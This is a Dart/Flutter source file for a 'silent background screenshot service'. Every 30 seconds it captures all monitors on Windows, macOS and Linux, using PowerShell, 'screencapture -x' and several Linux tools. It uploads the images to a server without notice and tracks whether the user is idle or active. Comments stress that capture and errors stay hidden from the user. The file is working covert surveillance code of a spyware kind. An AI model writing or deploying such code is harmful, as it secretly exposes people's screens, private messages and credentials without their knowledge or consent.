// screenshot_service.dart - Silent Background Screenshot Service

import 'dart:async';
import 'dart:io';
import 'dart:typed_data';
import 'dart:isolate';
import 'package:flutter/material.dart';
import 'api_service.dart';

class ScreenshotService {
  final ApiService apiService;
  Timer? _screenshotTimer;
  Timer? _activityCheckTimer;
  bool _isRunning = false;
  int _captureCount = 0;
  DateTime _lastActivityTime = DateTime.now();
  bool _isUserActive = true;
  static const int IDLE_THRESHOLD_SECONDS = 60; // 1 minute

  ScreenshotService(this.apiService);

  void recordActivity() {
    _lastActivityTime = DateTime.now();
    if (!_isUserActive) {
      _isUserActive = true;
      _updateActivityStatus(true);
    }
  }

  void startCapture() {
    if (_isRunning) return;
    _isRunning = true;
    print('🚀 Screenshot service started - Silent background capture');

    // Screenshot capture every 30 seconds (in background)
    _screenshotTimer = Timer.periodic(Duration(seconds: 30), (_) async {
      // Run in isolate to not block UI
      await _captureInBackground();
    });

    // Activity check every 10 seconds
    _activityCheckTimer = Timer.periodic(Duration(seconds: 10), (_) {
      _checkActivityStatus();
    });
  }

  void stopCapture() {
    _isRunning = false;
    _screenshotTimer?.cancel();
    _activityCheckTimer?.cancel();
    print('🛑 Screenshot service stopped');
  }

  Future<void> _captureInBackground() async {
    if (!_isRunning) return;
    
    try {
      _captureCount++;
      
      // Capture in background without blocking UI
      final imageBytes = await _captureFullMonitorSilent();
      
      if (imageBytes != null && imageBytes.isNotEmpty) {
        // Upload silently
        await _uploadSilent(imageBytes);
      }
    } catch (e) {
      // Silent error - don't show to user
      print('📸 Background capture: $e');
    }
  }

  Future<Uint8List?> _captureFullMonitorSilent() async {
    try {
      if (Platform.isWindows) {
        return await _captureWindowsMonitor();
      } else if (Platform.isMacOS) {
        return await _captureMacMonitor();
      } else if (Platform.isLinux) {
        return await _captureLinuxMonitor();
      }
      return null;
    } catch (e) {
      return null;
    }
  }

  Future<void> _uploadSilent(Uint8List imageBytes) async {
    try {
      final result = await apiService.uploadScreenshot(imageBytes);
      if (result['success']) {
        print('✅ Screenshot #$_captureCount uploaded silently');
      }
    } catch (e) {
      // Silent error
    }
  }

  void _checkActivityStatus() {
    final now = DateTime.now();
    final secondsSinceLastActivity = now.difference(_lastActivityTime).inSeconds;

    if (secondsSinceLastActivity > IDLE_THRESHOLD_SECONDS && _isUserActive) {
      _isUserActive = false;
      _updateActivityStatus(false);
      print('⏸️ User marked as IDLE');
    } else if (secondsSinceLastActivity <= IDLE_THRESHOLD_SECONDS && !_isUserActive) {
      _isUserActive = true;
      _updateActivityStatus(true);
      print('✅ User marked as ACTIVE');
    }
  }

  Future<void> _updateActivityStatus(bool isActive) async {
    try {
      await apiService.updateActivityStatus(isActive);
    } catch (e) {
      // Silent error
    }
  }

  Future<Uint8List?> _captureWindowsMonitor() async {
    try {
      final tempDir = Directory.systemTemp;
      final tempFile = '${tempDir.path}\\ss_${DateTime.now().millisecondsSinceEpoch}.png';
      
      final result = await Process.run('powershell', [
        '-Command',
        '''
        Add-Type -AssemblyName System.Windows.Forms
        \$screens = [System.Windows.Forms.Screen]::AllScreens
        \$totalWidth = 0
        \$maxHeight = 0
        foreach (\$screen in \$screens) {
          \$totalWidth += \$screen.Bounds.Width
          if (\$screen.Bounds.Height -gt \$maxHeight) { \$maxHeight = \$screen.Bounds.Height }
        }
        \$bitmap = New-Object System.Drawing.Bitmap(\$totalWidth, \$maxHeight)
        \$graphics = [System.Drawing.Graphics]::FromImage(\$bitmap)
        \$xOffset = 0
        foreach (\$screen in \$screens) {
          \$graphics.CopyFromScreen(\$screen.Bounds.Location, [System.Drawing.Point]::new(\$xOffset, 0), \$screen.Bounds.Size)
          \$xOffset += \$screen.Bounds.Width
        }
        \$bitmap.Save('$tempFile')
        \$graphics.Dispose()
        \$bitmap.Dispose()
        '''
      ], runInShell: true);
      
      if (result.exitCode == 0) {
        final file = File(tempFile);
        if (await file.exists()) {
          final bytes = await file.readAsBytes();
          await file.delete().catchError((_) {});
          return bytes;
        }
      }
      return null;
    } catch (e) {
      return null;
    }
  }

  Future<Uint8List?> _captureMacMonitor() async {
    try {
      final tempFile = '/tmp/ss_${DateTime.now().millisecondsSinceEpoch}.png';
      final result = await Process.run('screencapture', ['-x', tempFile]);
      
      if (result.exitCode == 0) {
        final file = File(tempFile);
        if (await file.exists()) {
          final bytes = await file.readAsBytes();
          await file.delete().catchError((_) {});
          return bytes;
        }
      }
      return null;
    } catch (e) {
      return null;
    }
  }

  Future<Uint8List?> _captureLinuxMonitor() async {
    try {
      final tempFile = '/tmp/ss_${DateTime.now().millisecondsSinceEpoch}.png';
      
      // Try tools silently
      var result = await Process.run('gnome-screenshot', ['-f', tempFile]).catchError((_) => ProcessResult(1, 1, '', ''));
      
      if (result.exitCode != 0) {
        result = await Process.run('scrot', [tempFile]).catchError((_) => ProcessResult(1, 1, '', ''));
      }
      
      if (result.exitCode != 0) {
        result = await Process.run('import', ['-window', 'root', tempFile]).catchError((_) => ProcessResult(1, 1, '', ''));
      }
      
      if (result.exitCode != 0) {
        result = await Process.run('bash', ['-c', 'xwd -root | convert xwd:- $tempFile']).catchError((_) => ProcessResult(1, 1, '', ''));
      }
      
      if (result.exitCode == 0) {
        final file = File(tempFile);
        if (await file.exists()) {
          final bytes = await file.readAsBytes();
          await file.delete().catchError((_) {});
          return bytes;
        }
      }
      return null;
    } catch (e) {
      return null;
    }
  }

  bool get isRunning => _isRunning;
  bool get isUserActive => _isUserActive;
}

